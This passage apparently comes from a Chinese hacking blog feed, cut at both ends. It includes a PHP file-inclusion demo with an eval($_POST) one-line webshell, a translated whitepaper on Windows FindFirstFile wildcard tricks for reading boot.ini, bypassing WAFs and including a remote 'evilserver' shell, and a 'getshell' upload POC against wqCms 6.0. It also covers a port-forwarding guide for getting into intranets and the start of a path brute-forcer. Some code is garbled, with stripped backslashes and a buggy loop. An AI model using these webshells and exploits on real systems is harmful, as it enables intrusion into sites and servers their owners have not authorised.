<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">include</span>($_GET[<span class="string">'file'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
</li>
<li><p>123456.txt中代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> phpinfo() <span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
</li>
<li><p>123456.TXT里面可以换成一句话木马，代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">"admin"</span>]) <span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
</li>
</ol>
<p>url:<a href="http://127.0.0.1/1.php?file=12" target="_blank" rel="external">http://127.0.0.1/1.php?file=12</a>&lt;&lt;<br>密码：admin<br><strong>注意</strong>：txt里面书写php代码不能换行写，最好是在同一行书写【原因待查明】</p>
<p><img src="https://ooo.0o0.ooo/2017/03/04/58ba6bd6354d3.png" alt="acccc1eb9b5be30878b4f979f2edadfc.jpg.png"></p>
<h1 id="windows的文件系统机制引发的PHP路径爆破问题分析"><a href="#windows的文件系统机制引发的PHP路径爆破问题分析" class="headerlink" title="windows的文件系统机制引发的PHP路径爆破问题分析"></a>windows的文件系统机制引发的PHP路径爆破问题分析</h1><h2 id="开场白"><a href="#开场白" class="headerlink" title="开场白"></a>开场白</h2><p>此次所披露的是以下网页中提出的问题所取得的测试结果：</p>
<p><a href="http://code.google.com/p/pasc2at/wiki/SimplifiedChinese" target="_blank" rel="external">http://code.google.com/p/pasc2at/wiki/SimplifiedChinese</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;<span class="number">255</span>; $i++) &#123;</div><div class="line">		$url = <span class="string">'1.ph'</span> . chr($i);</div><div class="line">		$tmp = @file_get_contents($url);</div><div class="line">		<span class="keyword">if</span> (!<span class="keyword">empty</span>($tmp)) <span class="keyword">echo</span> chr($i) . <span class="string">" "</span>;</div><div class="line">	&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>已知1.php存在，以上脚本访问的结果是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1.php</div><div class="line">1.phP</div><div class="line">1.ph&lt;</div><div class="line">1.ph&gt;</div></pre></td></tr></table></figure></p>
<p>都能得到返回。<br>前两种能返回结果是总所周知的（因为windows的文件系统支持大小的互转的机制），另外的两种返回引起了我们的注意。</p>
<p>测试php版本：PHP4.9,PHP5.2,PHP5.3,PHP6.0</p>
<p>测试系统：WINXP SP3 X32,WINXP SP2 X64，WIN7,WIN2K3</p>
<p>经测试我们得出的结论是：<strong>该漏洞影响所有的windows+php版本</strong></p>
<h2 id="深入探查模糊测试的结果"><a href="#深入探查模糊测试的结果" class="headerlink" title="深入探查模糊测试的结果"></a>深入探查模糊测试的结果</h2><p>为了继续深入探查关于该bug的信息，我们对demo做了些许修改:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">for</span> ($j=<span class="number">0</span>; $i&lt;<span class="number">256</span>; $j++) &#123;</div><div class="line">		<span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;<span class="number">256</span>; $i++) &#123;</div><div class="line">			$url = <span class="string">'1.p'</span> . chr($j) . chr($i);</div><div class="line">			$tmp = @file_get_contents($url);</div><div class="line">			<span class="keyword">if</span> (!<span class="keyword">empty</span>($tmp)) <span class="keyword">echo</span> chr($j) . chr($i) . <span class="string">" "</span>;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>在调试php解释器的过程中，我们将此“神奇”的漏洞归结为一个Winapi 函数FindFirstFile(）所产生的结果<a href="http://msdn.microsoft.com/en-us/library/aa364418(v=vs.85" target="_blank" rel="external">(http://msdn.microsoft.com/en-us/library/aa364418(v=vs.85).aspx)</a>.aspx).更好玩的是，当跟踪函数调用栈的过程中我们发现字符”&gt;”被替换成”?”，字符”&lt;”被替换成”*”，而符号”（双引号）被替换成一个”.”字符。这在2007年msdn公开的文档中被提及：<a href="http://msdn.microsoft.com/en-us/library/community/history/aa364418%28v=vs.85%29.aspx?id=3" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/community/history/aa364418%28v=vs.85%29.aspx?id=3</a></p>
<p>但是此bug至今未被任何windows旗下所发行的任何版本修复!</p>
<p>我们要阐明的是，该函数FindFirstFile()在php下的运用远远不至于file_get_contents().关于该bug可以利用的函数我们已经列了如下一表：</p>
<p>此外，我们还发现该利用也可以被运用到c++中，以下采用来自msdn的例子：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">void</span> _tmain(<span class="keyword">int</span> argc, TCHAR *argv[])&#123;</div><div class="line">	WIN32_FIND_DATA FindFileData;</div><div class="line">	HANDLE hFind;</div><div class="line">	<span class="keyword">if</span>( argc != <span class="number">2</span> )&#123;</div><div class="line">		_tprintf(TEXT(<span class="string">"Usage: %s [target_file] "</span>), argv[<span class="number">0</span>]);</div><div class="line">		<span class="keyword">return</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	_tprintf (TEXT(<span class="string">"Target file is %s "</span>), argv[<span class="number">1</span>]);</div><div class="line">	hFind = FindFirstFile(argv[<span class="number">1</span>], &amp;FindFileData);</div><div class="line">	<span class="keyword">if</span> (hFind == INVALID_HANDLE_VALUE)&#123;</div><div class="line">		<span class="built_in">printf</span> (<span class="string">"FindFirstFile failed (%d) "</span>, GetLastError());</div><div class="line">		<span class="keyword">return</span>;</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		_tprintf (TEXT(<span class="string">"The first file found is %s "</span>), FindFileData.cFileName);</div><div class="line">		FindClose(hFind);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>当传入参数”c:o&lt;”时，成功访问到boot.ini文件。</p>
<h2 id="利用方法总结"><a href="#利用方法总结" class="headerlink" title="利用方法总结"></a>利用方法总结</h2><ol>
<li><p>当调用FindFirstFile()函数时，”&lt;”被替换成” <em> ”,这意味该规则可以使”&lt;”替换多个任意字符，但是测试中发现并不是所有情况都如我们所愿。所以，**为了确保能够使”&lt;”被替换成”</em>”,应当采用”&lt;&lt;”**</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXAMPLE:include(‘shell&lt;&apos;);  或者include(‘shell&lt;&lt;&apos;);    //当文件夹中超过一个以shell打头的文件时，该执行取按字母表排序后的第一个文件。</div></pre></td></tr></table></figure>
</li>
<li><p>当调用FindFirstFile()函数时，”&gt;”被替换成”?”,这意味这”&gt;”可以替换单个任意字符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXAMPLE：include(‘shell.p&gt;p&apos;);    //当文件中超过一个以shell.p?p 通配时，该执行取按字母表排序后的第一个文件。</div></pre></td></tr></table></figure>
</li>
<li><p>当调用FindFirstFile()函数时，”””(双引号)被替换成”.”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXAMPLE:include(‘shell”php&apos;);    //===&gt;include(‘shell.php&apos;);</div></pre></td></tr></table></figure>
</li>
<li><p>如果文件名第一个字符是”.”的话，读取时可以忽略之</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXAMPLE：fopen(‘.htacess&apos;);  //==&gt;fopen(‘htacess&apos;);   //加上第一点中的利用 ==&gt;fopen(‘h&lt;&lt;&apos;);</div></pre></td></tr></table></figure>
</li>
<li><p>文件名末尾可以加上一系列的/或者的合集，你也可以在/或者中间加上.字符，只要确保最后一位为”.”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXAMPLE：fopen(“config.ini\.// ///.”);==&gt;  fopen(‘config.ini./..&apos;); ==&gt;fopen(‘config.ini/////.&apos;)==&gt;fopen(‘config.ini…..&apos;)   //译者注：此处的利用我不是很理解，有何作用？截断？</div></pre></td></tr></table></figure>
</li>
<li><p>该函数也可以调用以”\”打头的网络共享文件，当然这会耗费不短的时间。补充一点，如果共享名不存在时，该文件操作将会额外耗费4秒钟的时间，并可能触发时间响应机制以及max_execution_time抛错。所幸的是，该利用可以用来绕过allow_url_fopen=Off 并最终导致一个RFI（远程文件包含）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXAMPLE：include (‘\evilservershell.php&apos;);</div></pre></td></tr></table></figure>
</li>
<li><p>用以下方法还可以切换文件的盘名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">include(‘\.C:myfile.php......D:anotherfile.php&apos;);</div></pre></td></tr></table></figure>
</li>
<li><p>选择磁盘命名语法可以用来绕过斜线字符过滤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file_get_contents(‘C:boot.ini&apos;); //==&gt;  file_get_contents (‘C:/boot.ini&apos;);</div></pre></td></tr></table></figure>
</li>
<li><p>在php的命令行环境下（php.exe）,关于系统保留名文件的利用细节</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">EXAMPLE:file_get_contents(‘C:/tmp/con.jpg&apos;); //此举将会无休无止地从CON设备读取0字节，直到遇到eof</div><div class="line"></div><div class="line">EXAMPLE:file_put_contents(‘C:/tmp/con.jpg&apos;,chr(0×07));  //此举将会不断地使服务器发出类似哔哔的声音</div></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="更深入的利用方法"><a href="#更深入的利用方法" class="headerlink" title="更深入的利用方法"></a>更深入的利用方法</h2><p>除了以上已经展示的方法，你可以用下面的姿势来绕过WAF或者文件名过滤</p>
<p>请思考该例：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	file_get_contents(<span class="string">"/images/"</span>.$_GET[<span class="string">'a'</span>].<span class="string">".jpg"</span>);</div><div class="line">	<span class="comment">//or another function from Table 1, i.e. include().</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>访问test.php?a=../a&lt;%00</p>
<p>可能出现两种结果</p>
<ol>
<li><p>Warning: include(/images/../a&lt;) [function.include]: failed to open stream:Invalid argument in。。。</p>
</li>
<li><p>Warning: include(/images/../a&lt;) [function.include]: failed to open stream:Permission denied。。</p>
</li>
</ol>
<p>如果是第一种情况，说明不存在a打头的文件，第二种则存在。</p>
<p>此外，有记录显示，有时网站会抛出如下错误：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Warning: include(/admin_h1d3) [function.include]: failed to open stream: Permission denied..</div></pre></td></tr></table></figure></p>
<p>这说明该文件夹下存在一个以上以a打头的文件（夹），并且第一个就是admin_h1d3。</p>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>实验告诉我们，php本身没有那么多的漏洞，我们所看到是：过分的依赖于另一种程序语言（注：如文中的漏洞产自与winapi的一个BUG），并且直接强 制使用，将会导致细微的错误(bug)，并最终造成危害(vul).这样便拓宽了模糊测试的范畴（译者注：并不仅仅去研究web层面，而深入到系统底层），并最终导致IDS，IPS的规则更新。诚然，代码需要保护，需要补丁，需要升级与扩充。但是，这并不是我们真正要去关注的问题。在当下，我认为我们 更谨慎地去书写更多更严厉的过滤规则，正如我们一直在做的一样。任重道远，精益求精。</p>
<p>因为这是基础应用层的问题，所以我们猜想类似的问题可能出现在其他web应用中。于是我们还测试了mysql5,而实验结果表明，mysql5并不存在类似的漏洞。但是我们仍认为：类似的漏洞将会出现在诸如Perl、Python、Ruby等解释性语言上。</p>
<h2 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h2><blockquote>
<p>PHP application source code audits advanced technology:</p>
<p><a href="http://code.google.com/p/pasc2at/wiki/SimplifiedChinese" target="_blank" rel="external">http://code.google.com/p/pasc2at/wiki/SimplifiedChinese</a></p>
<p>MSDN FindFirstFile Function reference:</p>
<p><a href="http://msdn.microsoft.com/en-us/library/aa364418(v=vs.85).aspx" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/aa364418(v=vs.85).aspx</a></p>
<p>MSDN comments history:</p>
<p><a href="http://msdn.microsoft.com/en-us/library/community/history/aa364418(v=vs.85).aspx?id=3" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/community/history/aa364418(v=vs.85).aspx?id=3</a></p>
<p>MSDN article «Naming Files, Paths, and Namespaces»:</p>
<p><a href="http://msdn.microsoft.com/en-us/library/aa365247(v=vs.85).aspx" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/aa365247(v=vs.85).aspx</a></p>
<p>Technet article «Managing Files and Directories»:</p>
<p><a href="http://technet.microsoft.com/en-us/library/cc722482.aspx" target="_blank" rel="external">http://technet.microsoft.com/en-us/library/cc722482.aspx</a></p>
<p>Paper «Technique of quick exploitation of 2blind SQL Injection»:</p>
<p><a href="http://www.exploit-db.com/papers/13696/" target="_blank" rel="external">http://www.exploit-db.com/papers/13696/</a></p>
</blockquote>
<hr>
<p>全文完。</p>
<p>注：该文是2011年底发表的一篇白皮书，至今该bug依然存在。我在几个月前做CUIT的一个CTF时偶遇了一道该bug的利用，当时便是看的此文，当时只是粗粗读了一下，写了一个php的脚本去跑目录。今回闲来无事，翻译整理了一番。</p>
<p>文章转自群友</p>
<h1 id="版权声明："><a href="#版权声明：" class="headerlink" title="版权声明："></a>版权声明：</h1><p>文章所设计内容包括两部分<br>一是法师的书籍《代码审计-企业级web代码安全架构》<br>二是来自群友@evil7提供的资料<br>以下为资料原文：<br><a href="http://www.169it.com/blog_article/2302639890.html" target="_blank" rel="external">http://www.169it.com/blog_article/2302639890.html</a><br><a href="https://code.google.com/archive/p/pasc2at/wikis/SimplifiedChinese.wiki" target="_blank" rel="external">https://code.google.com/archive/p/pasc2at/wikis/SimplifiedChinese.wiki</a></p>
]]></content>
      
        <categories>
            
            <category> Hacker </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Hacker </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[wqCms6.0在IIS6的Getshell]]></title>
      <url>http://akkuman.coding.me/2017/02/22/wqCms6.0%E5%9C%A8IIS6%E7%9A%84Getshell.html</url>
      <content type="html"><![CDATA[<p>2017-02-15发布</p>
<h1 id="一、漏洞利用点"><a href="#一、漏洞利用点" class="headerlink" title="一、漏洞利用点"></a>一、漏洞利用点</h1><p>漏洞文件:admin_UploadDataHandler.ashx 自定义构造上传点<br><a id="more"></a></p>
<h1 id="二、hack-it"><a href="#二、hack-it" class="headerlink" title="二、hack it"></a>二、hack it</h1><p><img src="https://ooo.0o0.ooo/2017/02/22/58ad9095a4fe5.jpg" alt="77e968abd5e5cb3e2c4cdfbe620568fa.jpg"><br><img src="https://ooo.0o0.ooo/2017/02/22/58ad8ebcee2cf.jpg" alt="7281e4d1334393ddcc1c4926ad0065a8.jpg"></p>
<h1 id="三、POC"><a href="#三、POC" class="headerlink" title="三、POC"></a>三、POC</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/admin_UploadDataHandler.ashx"</span> <span class="attr">method</span>=<span class="string">"POST"</span><span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">input</span>  <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"uploadify"</span> /&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">input</span>  <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"saveFile"</span> <span class="attr">value</span>=<span class="string">"admin"</span> /&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"Upload"</span> <span class="attr">value</span>=<span class="string">"Submit Query"</span> /&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<p>转自群友论坛文章<a href="http://loner.fm/article.php?id=24236" target="_blank" rel="external">wobushou</a></p>
]]></content>
      
        <categories>
            
            <category> Hacker </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Hacker </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[otunnel：一个和lcx差不多的端口转发的工具]]></title>
      <url>http://akkuman.coding.me/2017/02/15/otunnel%EF%BC%9A%E4%B8%80%E4%B8%AA%E5%92%8Clcx%E5%B7%AE%E4%B8%8D%E5%A4%9A%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E7%9A%84%E5%B7%A5%E5%85%B7.html</url>
      <content type="html"><![CDATA[<p>这是一个采用Golang编写的和lcx差不多的端口转发的工具，用来突破内网环境</p>
<h1 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h1><p><a href="https://github.com/ooclab/otunnel" target="_blank" rel="external">ooclab/otunnel</a><br><a id="more"></a></p>
<h1 id="下载地址-内涵各大平台"><a href="#下载地址-内涵各大平台" class="headerlink" title="下载地址(内涵各大平台)"></a>下载地址(内涵各大平台)</h1><p><a href="http://dl.ooclab.com/otunnel/" target="_blank" rel="external">http://dl.ooclab.com/otunnel/</a></p>
<h1 id="otunnel-用法"><a href="#otunnel-用法" class="headerlink" title="otunnel 用法"></a>otunnel 用法</h1><p>前提：</p>
<ol>
<li>假设 server 的地址为 example.com</li>
<li>从 client 能连接 server (client 与 server 无需在同一个网络)</li>
</ol>
<p><strong>注意</strong>  otunnel 程序可以作为 server 和 client 两种角色（运行参数不同）</p>
<h2 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h2><h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./otunnel listen :10000 <span class="_">-s</span> longlongsecret</div></pre></td></tr></table></figure>
<h3 id="client"><a href="#client" class="headerlink" title="client"></a>client</h3><h4 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h4><p>举例：将 client 可以访问的 192.168.1.3:22 映射到 server 上的 10022 端口：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./otunnel connect example.com:10000 <span class="_">-s</span> longlongsecret -t <span class="string">'r:192.168.1.3:22::10022'</span></div></pre></td></tr></table></figure></p>
<p>现在访问 example.com:10022 即等于访问了 client 内网的 192.168.1.3:22</p>
<h4 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h4><p>举例：假设 example.com 的 127.0.0.1:3128 服务（你懂得），在 client 运行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./otunnel connect example.com:10000 <span class="_">-s</span> longlonglongsecret -t <span class="string">'f::20080:127.0.0.1:3128'</span></div></pre></td></tr></table></figure></p>
<p>现在 client 的 20080 端口， 等于访问 example.com 上的 127.0.0.1:3128</p>
<h2 id="程序用法"><a href="#程序用法" class="headerlink" title="程序用法"></a>程序用法</h2><h3 id="t-格式"><a href="#t-格式" class="headerlink" title="-t 格式"></a>-t 格式</h3><p>包含多个字段信息，以<code>:</code>隔开(为空的字段也不能省略<code>:</code>)。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">代理类型:本地地址:本地端口:远程地址:远程端口</div></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>字段</th>
<th style="text-align:center">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>代理类型</td>
<td style="text-align:center">r 表示反向代理; f 表示正向代理</td>
</tr>
<tr>
<td>本地地址</td>
<td style="text-align:center">IP或域名</td>
</tr>
<tr>
<td>本地端口</td>
<td style="text-align:center">整数</td>
</tr>
<tr>
<td>远程地址</td>
<td style="text-align:center">IP或域名</td>
</tr>
<tr>
<td>远程端口</td>
<td style="text-align:center">整数</td>
</tr>
</tbody>
</table>
<p><strong>注意</strong></p>
<ol>
<li><code>本地地址</code>或<code>远程地址</code>如果为空，表示所有网口</li>
<li>otunnel 命令行可以包含多个<code>-t</code>选项，同时指定多条隧道规则</li>
</ol>
<h1 id="特点及优势"><a href="#特点及优势" class="headerlink" title="特点及优势"></a>特点及优势</h1><p>otunnel 是一款对称的安全隧道工具。</p>
<ul>
<li>单二进制程序：otunnel 为一个独立的二进制程序，可以作为 server 和 client 端。</li>
<li>支持多操作系统平台：支持GNU/Linux, Unix-like, Mac, Windows，其他如 ddwrt 等 arm 平台。</li>
<li>无需配置文件：命令行使用</li>
<li>对称设计：同时支持 正、反向代理（端口映射）</li>
<li>安全加密：支持 AES 对称加密</li>
</ul>
<p><img src="https://ooo.0o0.ooo/2017/02/15/58a455a1b0a71.png" alt="otunnel反向代理图示"></p>
]]></content>
      
        <categories>
            
            <category> Tools </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Tools </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Golang初练手-多线程网站路径爆破]]></title>
      <url>http://akkuman.coding.me/2017/02/08/first-practice-for-Golang-Multithread-Website-Burster.html</url>
      <content type="html"><![CDATA[<p>以前用Python写过这个工具，前两天看了golang的基础，就想着用这个语言把这个工具重写一遍</p>
<p>先放张图<img src="https://ooo.0o0.ooo/2017/03/04/58ba4e8c66d38.gif" alt="演示1.gif"><br><a id="more"></a></p>
<p>用法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Example : Buster.exe -u=https://www.baidu.com -d=asp.txt -t=5</div><div class="line">Buster是你的程序名字</div><div class="line">-u后面填网址参数，格式如上</div><div class="line">-d选字典</div><div class="line">-t是线程数</div><div class="line">当你第一次运行请直接在命令行运行你的程序，什么参数都别加，他会有提示信息告诉你怎么做的</div></pre></td></tr></table></figure></p>
<p>话不多说，直接上代码，字典采用的以前搜集的一个珍藏的大字典，跑起来可能耗时比较久，文件外链会放在底下<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"bufio"</span></div><div class="line">	<span class="string">"flag"</span></div><div class="line">	<span class="string">"fmt"</span></div><div class="line">	<span class="string">"io/ioutil"</span></div><div class="line">	<span class="string">"net/http"</span></div><div class="line">	<span class="string">"os"</span></div><div class="line">	<span class="string">"sync"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="keyword">var</span> urls <span class="keyword">chan</span> <span class="keyword">string</span></div><div class="line"><span class="keyword">var</span> no404URL = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>)</div><div class="line"><span class="keyword">var</span> wg sync.WaitGroup <span class="comment">//等待goroutine完成</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line"></div><div class="line">	<span class="keyword">var</span> baseURL <span class="keyword">string</span></div><div class="line">	<span class="keyword">var</span> dicPath <span class="keyword">string</span></div><div class="line">	<span class="keyword">var</span> threadCount <span class="keyword">int</span></div><div class="line">	flag.StringVar(&amp;baseURL, <span class="string">"u"</span>, <span class="string">"https://www.baidu.com"</span>, <span class="string">"website which you want to burst"</span>)</div><div class="line">	flag.StringVar(&amp;dicPath, <span class="string">"d"</span>, <span class="string">"asp.txt"</span>, <span class="string">"dic which you want to use"</span>)</div><div class="line">	flag.IntVar(&amp;threadCount, <span class="string">"t"</span>, <span class="number">5</span>, <span class="string">"number of Thread"</span>)</div><div class="line">	flag.Parse()</div><div class="line"></div><div class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(os.Args) == <span class="number">1</span> &#123;</div><div class="line">		fmt.Println(<span class="string">"------------------------------------"</span>)</div><div class="line">		fmt.Println(<span class="string">" Author      |       Akkuamn"</span>)</div><div class="line">		fmt.Println(<span class="string">"------------------------------------"</span>)</div><div class="line">		fmt.Println(<span class="string">" Update-v1.0 |      2017-02-07"</span>)</div><div class="line">		fmt.Println(<span class="string">"-------------------------------------"</span>)</div><div class="line">		fmt.Printf(<span class="string">"\nUsage : \n\tExample : %s -u=https://www.baidu.com -d=asp.txt -t=5\n\n"</span>, os.Args[<span class="number">0</span>])</div><div class="line">		fmt.Printf(<span class="string">"View more help via %s -h\n\n"</span>, os.Args[<span class="number">0</span>])</div><div class="line">		